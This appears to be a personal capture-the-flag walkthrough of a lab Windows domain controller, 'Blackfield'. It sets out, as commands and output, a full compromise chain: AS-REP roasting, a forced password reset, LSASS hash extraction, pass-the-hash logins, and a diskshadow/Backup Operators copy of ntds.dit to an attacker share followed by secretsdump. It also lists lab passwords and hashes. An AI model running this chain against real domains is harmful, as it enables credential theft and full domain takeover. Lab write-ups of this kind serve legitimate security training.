# 10.10.10.192

#### nmap
```
╰─ sudo nmap -T4 10.10.10.192 -A -p- -Pn
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-28 12:08 EDT
Nmap scan report for blackfield.local (10.10.10.192)
Host is up (0.014s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-06-28 23:09:55Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (88%)
Aggressive OS guesses: Microsoft Windows Server 2019 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-06-28T23:10:02
|_  start_date: N/A
|_clock-skew: 6h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   16.51 ms 10.10.16.1
2   16.60 ms blackfield.local (10.10.10.192)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 140.02 seconds                                       
```

enum4linux - no info
lookupsid - no info

```
╰─ smbclient --no-pass -L 10.10.10.192

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	forensic        Disk      Forensic / Audit share.
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	profiles$       Disk      
	SYSVOL          Disk      Logon server share 

```

got userlist from profiles$

brute forced GetNPUsers.py to look for users without Kerberos pre-authentication required attribute (DONT_REQ_PREAUTH)

```
$krb5asrep$23$support@BLACKFIELD.LOCAL:4e9136416c988138ea8d6d2fa6204aea$6a63d4c5a4dcd9b965b38757963f2ec48af38b8d955b196543569f81b52712d8f65ed975601164414ab4d0a9a266634643c0857aba214410fd1a56a8c4494ecd86fa432662494949207a3e599a21fbdda291b03b498f5e5f52ec78e1c6843e67e458ab69ab2def51268260bdaa232d4faeae8555ecb7e622295fd752b0be9f70f488c47a3cddebb2321180c07b5b49669d7f8fa7e1127fc9f3ecd1982e3f5c32097afbf6f0363bc970fd78db889a377c4c1c52db39bdfdec6a4766773eb355529c613d3d5f2ae97cbc2d779c0458785abf0e4d8b18cfe3dde747c0426a45d729da902614f09cf4a8a23272279b48ee6d3ee3ff4f
```


```
support@blackfield.local #00^BlackKnight
```

no real access via ldap or win-rm

```
╰─ bloodhound-python -c ALL -d blackfield.local -u support -p '#00^BlackKnight' --zip -ns 10.10.10.192 -dc dc01.blackfield.local
INFO: Found AD domain: blackfield.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 18 computers
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 316 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: DC01.BLACKFIELD.local
WARNING: Failed to get service ticket for DC01.BLACKFIELD.local, falling back to NTLM auth
CRITICAL: CCache file is not found. Skipping...
WARNING: DCE/RPC connection failed: [Errno Connection error (dc01.blackfield.local:88)] [Errno -2] Name or service not known
INFO: Done in 00M 06S
INFO: Compressing output into 20230629121816_bloodhound.zip

```

![[2023-06-29 12_22_58-Kali 2023 - VMware Workstation.png]]

This command will ForceChangePassword on a non-DA user with proper privs
```
net rpc password Audit2020 -U blackfield.local/support -S dc01.blackfield.local -I 10.10.10.192
```

There is another way to abuse ForceChangePassword using [rpcclient](https://room362.com/post/2017/reset-ad-user-password-with-linux/)

`audit2020 pass123!`

no win-rm

the forensic share has an LSA minidump that can be processed with pypykatz
```
 pypykatz lsa minidump lsass.DMP 

	== MSV ==
		Username: svc_backup
		Domain: BLACKFIELD
		LM: NA
		NT: 9658d1d1dcd9250115e2205d9f48400d
		SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
		DPAPI: a03cd8e9d30171f3cfe8caad92fef621

```

this account can connect to winrm by passing the hash
```
evil-winrm -i dc01.blackfield.local -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```

audit2020 has [SeMachineAcccountPrivileges](https://cloudbrothers.info/en/exploit-kerberos-samaccountname-spoofing/) and has a [MS-DS-Machine-Account-Quota](https://www.jorgebernhardt.com/how-to-change-attribute-ms-ds-machineaccountquota/) set to not 0

This attack requires Powerview and [Powermad](https://github.com/Kevin-Robertson/Powermad/). Its slightly too complicated for me to deal with at the moment so instead I'm going to abuse the [[09. Backup Operators Group|Backup Operators Group]] privs

This requires using Diskshadow.exe. In evil-winrm interactive mode doesn't work correctly so it will require a script
```
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
```

then it needs to be converted with `unix2dos` so it will run correctly

then run it on the target with `diskshadow /s vss.dsh`
Grab the ntds.dit from the newly created backup E: drive. This requires https://github.com/giuliano108/SeBackupPrivilege
Import the Se..Utils.dll and Se...Cmdlets.dll
```
Set-SeBackupPrivilege #activate priv
Copy-FileBackupPrivilege e:\windows\ntds\ntds.dit \\IP\Share\ntds.dit
```

Also dump the system reg hive `reg.exe save hklm\system system.sav` and transfer back
then dump ntds locally with secretsdump.py
```
secretsdump.py -system system.sav -ntds ntds.dit LOCAL
```